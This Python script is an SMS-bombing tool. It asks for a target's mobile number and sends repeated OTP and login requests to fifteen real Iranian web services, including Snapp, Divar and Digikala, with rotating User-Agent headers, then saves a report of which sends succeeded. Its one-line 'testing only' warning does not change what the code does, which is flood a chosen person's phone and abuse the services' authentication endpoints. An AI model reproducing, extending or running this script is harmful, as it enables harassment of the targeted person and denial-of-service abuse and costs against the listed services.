import requests
import time
import json
import random
from rich.console import Console
from rich.panel import Panel
from rich.progress import track
from rich.table import Table
from datetime import datetime

console = Console()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

def get_random_headers():
    return {
        'User-Agent': random.choice(user_agents),
        'Content-Type': 'application/json'
    }

def get_target_number():
    console.print("[bold cyan]Enter mobile number without 0 (example: 9121234567):[/bold cyan]", end=" ")
    number = input().strip()
    if number.startswith("0"):
        number = number[1:]
    return "0" + number

services = [
    {"name": "Snapp", "url": "https://api.snapp.ir/api/v1/sms/link", "json_key": "phone", "extra_json": {"type": "LOGIN"}},
    {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "json_key": "phone"},
    {"name": "Tap30", "url": "https://api.tapsi.cab/api/v2.3/user", "json_key": "credential", "extra_json": {"otpOption": "SMS"}},
    {"name": "Sheypoor", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "json_key": "username"},
    {"name": "Basalam", "url": "https://auth.basalam.com/otp-request", "json_key": "mobile"},
    {"name": "Alibaba", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "json_key": "phoneNumber"},
    {"name": "Filimo", "url": "https://www.filimo.com/api/fa/v1/user/Authenticate/sendotp", "json_key": "cellphone"},
    {"name": "Namava", "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "json_key": "UserName"},
    {"name": "DigiKala", "url": "https://api.digikala.com/v1/user/authenticate/", "json_key": "username"},
    {"name": "Torob", "url": "https://api.torob.com/v4/user/send-auth-code/", "json_key": "phone_number"},
    {"name": "Aparat", "url": "https://www.aparat.com/api/fa/v1/user/Authenticate/check_mobile", "json_key": "mobile"},
    {"name": "Okala", "url": "https://api.okala.com/api/v2/account/request-otp", "json_key": "mobile"},
    {"name": "Digistyle", "url": "https://www.digistyle.com/api/v1/user/authenticate/", "json_key": "username"},
    {"name": "Shad", "url": "https://authbeta.snd.ir/api/v2/login/request", "json_key": "username"},
    {"name": "Gap", "url": "https://core.gap.im/v1/user/add.json?mobile=", "is_get": True},
]

def send_sms(service, phone):
    if service.get("is_get"):
        try:
            res = requests.get(service["url"] + phone, headers=get_random_headers(), timeout=10)
            return res.status_code == 200
        except:
            return False

    json_data = {service["json_key"]: phone}
    if service.get("extra_json"):
        json_data.update(service["extra_json"])

    try:
        res = requests.post(service["url"], json=json_data, headers=get_random_headers(), timeout=10)
        return res.status_code == 200
    except:
        return False

def save_report(data):
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"sms_report_{now}.json"
    with open(filename, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    return filename

def show_summary(success, failed, errors):
    table = Table(title="📊 Final Report", title_style="bold green")
    table.add_column("Status", justify="center", style="cyan")
    table.add_column("Count", justify="center", style="magenta")
    table.add_row("✅ Success", str(success))
    table.add_row("❌ Failed", str(failed))
    table.add_row("⚠ Error", str(errors))
    console.print(table)

def main():
    console.print(Panel("[bold red]⚠ Legal Warning: This tool should only be used for testing and security assessment. Unauthorized use is prosecutable.[/bold red]"))
    phone = get_target_number()

    console.print("[bold cyan]Enter number of rounds to send to each service (example: 2):[/bold cyan]", end=" ")
    rounds = int(input().strip())

    console.print(Panel(f"[bold green]Starting SMS test to number {phone} with {len(services)} services in {rounds} rounds[/bold green]"))

    success = 0
    failed = 0
    error = 0
    report_log = []

    for round_num in track(range(1, rounds + 1), description="[yellow]Running test...[/yellow]"):
        for service in services:
            result = send_sms(service, phone)
            entry = {
                "round": round_num,
                "service": service["name"],
                "status": "success" if result else "failed",
                "time": datetime.now().isoformat()
            }
            report_log.append(entry)
            if result:
                success += 1
                console.print(f"[green]✔ {service['name']} Success[/green]")
            else:
                failed += 1
                console.print(f"[red]✘ {service['name']} Failed[/red]")
            time.sleep(1)

    show_summary(success, failed, error)
    filename = save_report(report_log)
    console.print(f"[bold yellow]📁 Report saved to file: [green]{filename}[/green][/bold yellow]")

if __name__ == "__main__":
    main()